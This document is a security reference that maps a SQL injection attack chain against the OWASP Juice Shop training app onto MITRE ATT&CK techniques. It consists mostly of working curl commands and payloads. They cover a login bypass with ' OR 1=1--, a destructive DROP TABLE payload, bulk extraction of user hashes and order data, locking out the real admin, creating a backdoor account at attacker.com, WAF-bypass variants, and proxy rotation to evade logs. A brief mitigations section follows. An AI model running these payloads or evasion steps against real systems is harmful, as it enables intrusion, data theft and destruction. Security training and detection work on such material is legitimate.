# MITRE ATT&CK Mapping: Juice Shop SQL Injection Attack Chain

## Attack Flow Overview

```
Reconnaissance → Discovery → Exploitation → Privilege Escalation → Post-Exploitation
    |               |            |                  |                    |
   T1592       T1590, T1595   T1190, T1078       T1078              T1087, T1005
```

---

## PHASE 1: RECONNAISSANCE & DISCOVERY

### T1592 (Gather Victim Org Info)
**Objective:** Identify Juice Shop as target, determine it runs on localhost:3000

**Techniques:**
```bash
# Service discovery
curl -s http://localhost:3000 | grep -i "juice\|owasp"

# Port enumeration
nmap -p 3000 localhost
```

**Artifacts:**
- Juice Shop running on port 3000
- Identifies as vulnerable training application

---

### T1590 (Gather Victim Network Info)
**Objective:** Map application endpoints and authentication mechanisms

**Techniques:**
```bash
# API reconnaissance
curl -s http://localhost:3000/rest/ 
curl -s http://localhost:3000/api/

# Endpoint discovery
for path in login auth user admin users; do
  curl -s -X POST "http://localhost:3000/rest/$path" \
    -H "Content-Type: application/json" \
    -d '{}' 2>&1 | head -5
done
```

**Findings:**
- `/rest/user/login` endpoint identified
- Accepts JSON payloads
- Error messages reveal account existence

---

### T1595 (Active Scanning)
**Objective:** Probe for SQL injection vulnerabilities

**Techniques:**
```bash
# Boolean-based SQL injection detection
curl -X POST "http://localhost:3000/rest/user/login" \
  -d '{"email":"admin@juice-sh.op' AND '1'='2","password":"x"}'

curl -X POST "http://localhost:3000/rest/user/login" \
  -d '{"email":"admin@juice-sh.op' AND '1'='1","password":"x"}'
```

**Result:** Different responses indicate injectable parameter

---

## PHASE 2: EXPLOITATION

### T1190 (Exploit Public-Facing Application)
**Objective:** Execute SQL injection to bypass authentication

**Exploit Details:**
```
Vulnerability: SQL Injection (CWE-89)
Endpoint: POST /rest/user/login
Parameter: email (JSON body)
Method: Comment-based (OR 1=1--)
```

**Attack Steps:**

**Step 1: Identify Admin Account**
```bash
curl -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrongpass"}'

# Response: "Invalid email or password." 
# Confirms account exists
```

**Step 2: Inject SQL to Bypass Auth**
```bash
curl -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op' OR 1=1--","password":"anything"}'

# Response: JWT token returned
# Authentication bypassed ✓
```

**SQL Query Transformation:**
```
BEFORE:
SELECT * FROM users 
WHERE email = 'admin@juice-sh.op' 
AND password = 'anything'

AFTER (with injection):
SELECT * FROM users 
WHERE email = 'admin@juice-sh.op' OR 1=1--' 
AND password = 'anything'

EXECUTION:
- OR 1=1 evaluates to TRUE
- Always returns first matching user (admin)
- -- comments out password check
```

**Payload Variations:**

| Payload | Result | Purpose |
|---------|--------|---------|
| `admin@juice-sh.op' OR '1'='1` | Admin access | Authentication bypass |
| `' OR 1=1--` | Any user | Generic bypass |
| `admin@juice-sh.op' UNION SELECT...` | Data exfiltration | Query manipulation |
| `admin@juice-sh.op'; DROP TABLE users--` | Destructive | Database damage |

---

### T1078 (Valid Accounts)
**Objective:** Obtain and use valid admin credentials

**Result:**
```json
{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

**Token Properties:**
- Valid JWT signed by server
- Contains admin user ID (1)
- Grants full administrative privileges
- No expiration visible in payload

---

## PHASE 3: PRIVILEGE ESCALATION

### T1078 (Valid Accounts) - Continued
**Objective:** Use compromised admin account for further access

**Administrative Capabilities:**

**1. User Enumeration:**
```bash
TOKEN="eyJ0eXAi..."
curl -s "http://localhost:3000/api/Users" \
  -H "Authorization: Bearer ${TOKEN}"

# Returns all user accounts, hashes, emails, personal data
```

**2. Role Escalation:**
- Already achieved (user → admin)
- Create new admin accounts for persistence

**3. Access Control Bypass:**
- Disabled functionality now accessible
- Payment processing endpoints
- Admin dashboards
- System configuration

---

## PHASE 4: POST-EXPLOITATION

### T1087 (Account Discovery)
**Objective:** Enumerate compromised system users

**Techniques:**
```bash
TOKEN="eyJ0eXAi..."

# List all user accounts
curl -s "http://localhost:3000/api/Users" \
  -H "Authorization: Bearer ${TOKEN}" | jq '.users[] | {id, email, role}'

# Extract credentials
curl -s "http://localhost:3000/api/Users" \
  -H "Authorization: Bearer ${TOKEN}" | jq '.users[] | {email, password_hash}'
```

**Data Harvested:**
- Email addresses (privacy violation)
- Password hashes (potential cracking)
- User roles and permissions
- Account creation dates
- Last login timestamps

### T1005 (Data from Local System)
**Objective:** Exfiltrate sensitive application data

**High-Value Targets:**

```
1. User Database
   - Customer emails
   - Password hashes
   - Delivery addresses
   - Phone numbers

2. Order History
   - Customer names & addresses
   - Payment methods (last 4 digits)
   - Order totals & dates

3. Configuration Data
   - API keys (if stored in app)
   - Database credentials (if exposed)
   - System paths and hostnames
   - Third-party integrations

4. Payment Information
   - Credit card data (if PCI-DSS failed)
   - Transaction logs
   - Billing addresses
```

**Exfiltration Example:**
```bash
TOKEN="eyJ0eXAi..."

# Extract all orders
curl -s "http://localhost:3000/api/Orders" \
  -H "Authorization: Bearer ${TOKEN}" \
  | jq '.orders[] | {customerId, email, address, total}' \
  > /tmp/orders.json

# Extract products
curl -s "http://localhost:3000/api/Products" \
  -H "Authorization: Bearer ${TOKEN}" \
  | jq '.products[] | {id, name, description, price}' \
  > /tmp/products.json

# Combine into comprehensive dataset
jq -s 'add' /tmp/orders.json /tmp/products.json > compromise.json
```

### T1531 (Account Access Removal)
**Objective:** Maintain persistence by locking out legitimate admin

**Technique:**
```bash
TOKEN="eyJ0eXAi..."

# Lock original admin account
curl -s "http://localhost:3000/api/admin/users/1" \
  -X PATCH \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"isActive": false}'

# Create backdoor admin account
curl -s "http://localhost:3000/api/admin/users" \
  -X POST \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"email":"backdoor@attacker.com","password":"StrongBackdoorPass123","role":"admin","isActive":true}'
```

---

## ATTACK CHAIN SUMMARY

| Phase | Technique | Action | Success Criteria |
|-------|-----------|--------|------------------|
| 1 | T1592, T1590 | Discover Juice Shop, map endpoints | Identify /rest/user/login |
| 2 | T1595 | Probe for SQL injection | Different responses = vulnerable |
| 3 | T1190 | Execute SQLi exploit | Receive JWT token |
| 4 | T1078 | Authenticate as admin | Access granted |
| 5 | T1087 | Enumerate users | Harvest user data |
| 6 | T1005 | Exfiltrate data | Download database |
| 7 | T1531 | Maintain persistence | Create backdoor account |

---

## DETECTION EVASION TECHNIQUES

### False Positives
**Technique 1: Bypass WAF with Case Variation**
```
VULNERABLE: ' OR 1=1--
BYPASS:     ' Or 1=1--
            ' oR 1=1--
            ' OR/**/ 1=1--
```

**Technique 2: Comment Obfuscation**
```
VULNERABLE: ' OR 1=1--
BYPASS:     ' OR 1=1 #
            ' OR 1=1 /**/
            ' OR 1=1 /*!50000*/
```

**Technique 3: Operator Obfuscation**
```
VULNERABLE: ' OR 1=1
BYPASS:     ' || 1=1        (PostgreSQL)
            ' | (1=1)       (Oracle)
            ' UNION NULL--  (Multiple columns)
```

### Log Evasion
```bash
# VPN/Proxy rotation
for i in {1..10}; do
  curl --socks5 proxy$i:9050 \
    -X POST "http://localhost:3000/rest/user/login" \
    -d '{"email":"admin@juice-sh.op' OR 1=1--","password":"x"}'
done

# Distributed attacks over time
sleep 3600  # Wait 1 hour between attempts
# Reduces detection likelihood in log analysis
```

---

## DEFENSIVE MITIGATIONS

### Prevent T1190 (Exploit)
✓ **Parameterized Queries** - Prevents SQL injection entirely
✓ **Input Validation** - Reject SQL metacharacters
✓ **ORM Frameworks** - Automatic parameterization

### Prevent T1078 (Valid Accounts)
✓ **Multi-Factor Authentication** - Even if password compromised
✓ **IP Whitelisting** - Restrict login origins
✓ **Login Alerts** - Alert on unusual access patterns

### Prevent T1087 (Account Discovery)
✓ **API Authentication** - Require valid JWT/credentials
✓ **Rate Limiting** - Throttle enumeration attempts
✓ **Role-Based Access Control** - Restrict data visibility

### Prevent T1005 (Data Exfiltration)
✓ **Data Encryption** - Encrypt sensitive data at rest & in transit
✓ **DLP Tools** - Monitor for bulk data downloads
✓ **Network Segmentation** - Restrict outbound connections

---

## REFERENCE LINKS

- [MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK T1078](https://attack.mitre.org/techniques/T1078/)
- [MITRE ATT&CK T1087](https://attack.mitre.org/techniques/T1087/)
- [MITRE ATT&CK T1005](https://attack.mitre.org/techniques/T1005/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

**Document Date:** 2026-03-09  
**Classification:** Technical Security Reference  
**Audience:** Security Professionals, Developers, Analysts
